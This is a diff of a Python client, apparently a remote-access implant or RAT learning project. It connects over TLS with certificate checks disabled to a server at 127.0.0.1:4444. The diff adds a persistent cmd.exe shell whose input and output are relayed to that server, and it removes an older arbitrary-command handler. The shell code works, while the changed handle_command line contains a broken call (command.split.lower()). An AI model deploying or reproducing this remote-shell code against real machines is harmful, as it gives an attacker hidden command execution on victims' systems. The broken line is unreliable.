@@ -1,35 +1,82 @@
 import socket
 import ssl
 import subprocess
+import threading
 
 from utils.protocol import decode_message, encode_message
 from utils.logger import logger
 
 
-# --------- FAKE COMMAND EXECUTOR --------- #
+# ---------- GLOBAL SHELL ---------- #
+shell_proc = None
+
+
+# ---------- START SHELL ---------- #
+def start_shell(client):
+    global shell_proc
+
+    if shell_proc:
+        return
+
+    logger.info("[+] Starting persistent shell")
+
+    shell_proc = subprocess.Popen(
+        ["cmd.exe"],  # change to /bin/bash for Linux
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1
+    )
+
+    threading.Thread(
+        target=read_shell_output,
+        args=(client,),
+        daemon=True
+    ).start()
+
+
+# ---------- READ SHELL OUTPUT ---------- #
+def read_shell_output(client):
+    global shell_proc
+
+    try:
+        for line in iter(shell_proc.stdout.readline, ''):
+            if not line:
+                break
+
+            packet = {
+                "type": "shell_output",
+                "data": line
+            }
+
+            client.send(encode_message(packet))
+
+    except Exception as e:
+        logger.exception(f"Shell output error: {e}")
+
+
+# ---------- SEND COMMAND TO SHELL ---------- #
+def send_to_shell(command):
+    global shell_proc
+
+    if not shell_proc:
+        return
+
+    try:
+        shell_proc.stdin.write(command + "\n")
+        shell_proc.stdin.flush()
+
+    except Exception as e:
+        logger.exception(f"Shell input error: {e}")
+
+
+# ---------- FAKE COMMANDS ---------- #
 def handle_command(command: str, args=None) -> str:
-    cmd = command.split()[0].lower()
+    cmd = command.split.lower()
 
     if cmd == "ipconfig":
         return "Fake IP config:\nIP: 127.0.0.1\nGateway: 192.168.1.1"
-
-    elif cmd == "shell_exec":
-        try:
-            full_command = " ".join(args) if args else ""
-
-            result = subprocess.run(
-                full_command,
-                shell=True,
-                capture_output=True,
-                text=True,
-                cwd="C:\\"
-            )
-
-            output = result.stdout + result.stderr
-            return output.strip() if output else "[no output]"
-
-        except Exception as e:
-            return f"Execution error: {e}"
 
     elif cmd == "download":
         return "Fake file sent to server"
@@ -63,25 +110,16 @@ def main():
     host = "127.0.0.1"
     port = 4444
 
-    # --- TLS CONTEXT --- #
     context = ssl.create_default_context()
-
-    # --- self-signed cert --- #
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
 
-    # --- RAW SOCKET --- #
     raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # --- WRAP WITH TLS --- #
     client = context.wrap_socket(raw_socket, server_hostname=host)
 
-    # --- CONNECT --- #
     client.connect((host, port))
-
     logger.info("Securely connected to server")
 
-    # -------- MAIN LOOP -------- #
     while True:
         try:
             data = client.recv(4096)
@@ -91,8 +129,10 @@ def main():
                 break
 
             msg = decode_message(data)
+            msg_type = msg.get("type")
 
-            if msg.get("type") == "command":
+            # ---------- NORMAL COMMAND ---------- #
+            if msg_type == "command":
                 cmd = msg.get("cmd")
                 args = msg.get("args")
 
@@ -111,6 +151,15 @@ def main():
                 }
 
                 client.send(encode_message(response))
+
+            # ---------- START SHELL ---------- #
+            elif msg_type == "shell_start":
+                start_shell(client)
+
+            # ---------- SHELL COMMAND ---------- #
+            elif msg_type == "shell_command":
+                command = msg.get("cmd")
+                send_to_shell(command)
 
         except ssl.SSLError as e:
             logger.error(f"SSL error: {e}")
